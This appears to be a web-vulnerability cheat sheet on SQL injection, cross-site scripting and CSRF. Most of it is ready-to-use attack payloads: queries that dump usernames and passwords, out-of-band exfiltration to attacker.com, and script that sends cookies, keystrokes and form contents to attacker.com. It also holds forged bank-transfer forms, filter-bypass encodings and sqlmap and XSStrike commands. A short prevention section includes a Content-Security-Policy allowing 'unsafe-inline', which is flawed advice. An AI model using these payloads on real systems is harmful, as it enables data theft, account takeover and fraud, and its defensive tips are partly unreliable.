**SQL Injection (SQLi)**, **Cross-Site Scripting (XSS)**, and **Cross-Site Request Forgery (CSRF)**.

---

# Web Vulnerability (SQLi, XSS, CSRF) Ultimate Cheat Sheet

## 1. SQL Injection (SQLi)

SQLi involves injecting malicious SQL code into a query to manipulate the database.

### Detection & Identification
```sql
/* Classic Probe for Error-Based SQLi */
' 
" 
` 
') 
") 
`) 
')) 
")) 
`)) 

/* Always True/False Statements */
' OR 1=1-- -
" OR 1=1-- -
' OR 'a'='a
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -  /* Keep adding NULL until error disappears */

/* Time-Based Blind SQLi Probe */
' OR SLEEP(5)-- -
" OR SLEEP(5)-- -
'; WAITFOR DELAY '00:00:05'-- -  /* MSSQL */
' OR BENCHMARK(10000000,MD5(1))-- -
```

### Exploitation Payloads

#### **Union-Based Attacks**
```sql
/* Find number of columns */
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -  /* Continue until error */

/* Extract database version */
' UNION SELECT @@version,NULL-- -
' UNION SELECT version(),NULL-- -  /* PostgreSQL */

/* Extract database names */
' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -

/* Extract table names */
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='database_name'-- -

/* Extract column names */
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -

/* Dump data */
' UNION SELECT username,password FROM users-- -
' UNION SELECT NULL,CONCAT(username,':',password) FROM users-- -
```

#### **Error-Based Attacks**
```sql
/* MySQL */
' AND ExtractValue(1, CONCAT(0x3a, @@version))-- -
' AND UpdateXML(1, CONCAT(0x3a, @@version), 1)-- -

/* MSSQL */
' AND (SELECT * FROM (SELECT CAST(@@version AS INT))=1-- -

/* PostgreSQL */
' AND CAST((SELECT version()) AS INTEGER)=1-- -
```

#### **Blind Boolean-Based Attacks**
```sql
' AND SUBSTRING(@@version,1,1)='5'-- -
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97-- -
```

#### **Time-Based Blind Attacks**
```sql
' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)-- -
'; IF (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')=1 WAITFOR DELAY '00:00:05'-- -
```

#### **Out-of-Band Exploitation**
```sql
/* DNS Exfiltration (Oracle) */
' AND (SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='admin')||'.attacker.com/"> %remote;]>'),'/l') FROM dual)-- -

/* MSSQL */
'; EXEC master..xp_dirtree '\\attacker.com\'+(SELECT password FROM users WHERE username='admin')-- -
```

### Bypassing Filters
```sql
/* Case Manipulation */
' UnIoN SeLeCt 1,2,3-- -

/* White Space Bypass */
'UNION/**/SELECT/**/1,2,3-- -

/* Comment Bypass */
'UNI/**/ON SEL/**/ECT 1,2,3-- -

/* URL Encoding */
%27%20UNION%20SELECT%201,2,3--%20-

/* Double URL Encoding */
%2555nion%2553elect

/* Unicode Encoding */
%u0027%u0020UNION%u0020SELECT%u00201,2,3--%u0020-

/* Hex Encoding */
0x27554e494f4e2053454c45435420312c322c332d2d2020

/* Char() Function */
' UNION SELECT CHAR(97),CHAR(98),CHAR(99)-- -
```

---

## 2. Cross-Site Scripting (XSS)

XSS involves injecting malicious scripts into web pages viewed by other users.

### Detection & Proof-of-Concept
```html
<!-- Basic Probe -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Without Special Characters -->
<IMG SRC=javascript:alert('XSS')>

<!-- Case Insensitive -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- Event Handlers -->
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<iframe src=javascript:alert('XSS')>

<!-- SVG Vector -->
<svg><script>alert('XSS')</script></svg>

<!-- HTML Entities -->
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

### Advanced XSS Payloads

#### **Stored XSS**
```html
<!-- Comment Field -->
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

<!-- Profile Field -->
<img src=x onerror="fetch('http://attacker.com/steal', {method:'POST',body:document.cookie})">
```

#### **DOM-Based XSS**
```javascript
// URL: http://example.com/page#<script>alert('XSS')</script>
<script>eval(document.location.hash.slice(1))</script>

// Using document.write
<script>document.write('<img src=x onerror=alert("XSS")>')</script>
```

#### **Filter Bypass Techniques**
```html
<!-- Bypass script tag filter -->
<IMG SRC=javascript:alert('XSS')>
<IMG SRC="jav ascript:alert('XSS');">

<!-- Using HTML entities -->
&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;

<!-- Using JavaScript functions -->
<script>String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)</script>

<!-- Using Base64 encoding -->
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### **Real-World Attack Payloads**
```html
<!-- Cookie Stealing -->
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>

<!-- Form Hijacking -->
<script>document.forms[0].onsubmit=function(){fetch('http://attacker.com/steal',{method:'POST',body:new FormData(this)})}</script>

<!-- CSRF Token Stealing -->
<script>fetch('http://attacker.com/steal?token='+document.querySelector('meta[name="csrf-token"]').content)</script>
```

---

## 3. Cross-Site Request Forgery (CSRF)

CSRF tricks users into executing unwanted actions on a web application where they're authenticated.

### Basic CSRF Attacks
```html
<!-- GET Request CSRF -->
<img src="http://bank.com/transfer?amount=1000&to=attacker" width="0" height="0">

<!-- POST Request CSRF -->
<form action="http://bank.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.getElementById('csrf').submit()</script>
```

### Advanced CSRF Techniques

#### **Bypassing CSRF Tokens**
```html
<!-- If token is predictable -->
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="csrf_token" value="predictable_token">
</form>

<!-- If token is in cookie (Double Submit Cookie) -->
<script>
// The application sets CSRF token in cookie and expects same value in form
document.cookie = "csrf_token=attacker_token";
</script>
```

#### **JSON CSRF ( with Flash)**
```html
<!-- Using Flash to send JSON with custom Content-Type -->
<embed src="http://attacker.com/csrf.swf?url=http://bank.com/api/transfer&data={'amount':1000,'to':'attacker'}" />
```

#### **Content-Type Bypass**
```html
<!-- If application accepts form-data instead of JSON -->
<form action="http://bank.com/api/transfer" method="POST" enctype="text/plain">
  <input name='{"amount":1000,"to":"attacker","ignore":"' value='test"}' type="hidden">
</form>
```

### CSRF Protection Bypass

#### **SameSite Cookie Bypass**
```javascript
// GET-based attack still works with SameSite=Lax
<img src="https://bank.com/change-email?email=attacker@evil.com">

// POST with 302 redirect
fetch('https://attacker.com/redirector', {credentials: 'include'})
```

#### **Referrer Header Bypass**
```html
<!-- If check is weak (contains domain) -->
<meta name="referrer" content="no-referrer">
<!-- Or use data: URL -->
<iframe src="data:text/html,<form action='http://bank.com/transfer' method='POST'>...</form>">
```

#### **Origin Header Bypass**
```html
<!-- Use null origin -->
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,..."></iframe>
```

---

## 4. Tools for Automation

### SQLi Tools
```bash
# SQLMap
sqlmap -u "http://example.com/page?id=1" --dbs
sqlmap -u "http://example.com/login" --data="username=admin&password=test" --level=5

# NoSQLi Tools
nosqlmap -u http://example.com/login -d 'username=admin&password=test'
```

### XSS Tools
```bash
# XSStrike
python3 xsstrike.py -u "http://example.com/search?q=test"

# XSSer
xsser -u "http://example.com/search?q=test" --auto

# Dalfox
dalfox url "http://example.com/search?q=test"
```

### CSRF Tools
```bash
# Generate CSRF PoC
curl -X POST http://example.com/transfer -d "amount=1000&to=attacker" -H "Referer: http://example.com"

# CSRFTool
python3 csrftool.py -u http://example.com/transfer -m POST -d "amount=1000&to=attacker"
```

---

## 5. Prevention Cheat Sheet

### SQL Injection Prevention
```php
// Use prepared statements (PHP/PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

// Use parameterized queries
$query = "SELECT * FROM users WHERE id = $1";
pg_query_params($conn, $query, [$id]);

// Input validation
if (!is_numeric($id)) { die("Invalid input"); }
```

### XSS Prevention
```html
<!-- Context-aware output encoding -->
<div><?php echo htmlspecialchars($user_input, ENT_QUOTES); ?></div>

<!-- CSP Header -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'">

<!-- HTTP Headers -->
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
```

### CSRF Prevention
```html
<!-- CSRF Tokens -->
<form>
  <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
</form>

<!-- SameSite Cookies -->
Set-Cookie: session=abc123; SameSite=Strict; Secure

<!-- Check Origin/Referer -->
if ($_SERVER['HTTP_ORIGIN'] !== 'https://example.com') {
    die("Invalid request");
}
```

---

## 6. Testing Methodology

1. **Reconnaissance**: Spidering, parameter discovery
2. **Detection**: Probe all inputs with basic payloads
3. **Exploitation**: Develop specific payloads for the context
4. **Exfiltration**: Extract data or perform actions
5. **Persistence**: Maintain access if possible
6. **Reporting**: Document findings with PoCs

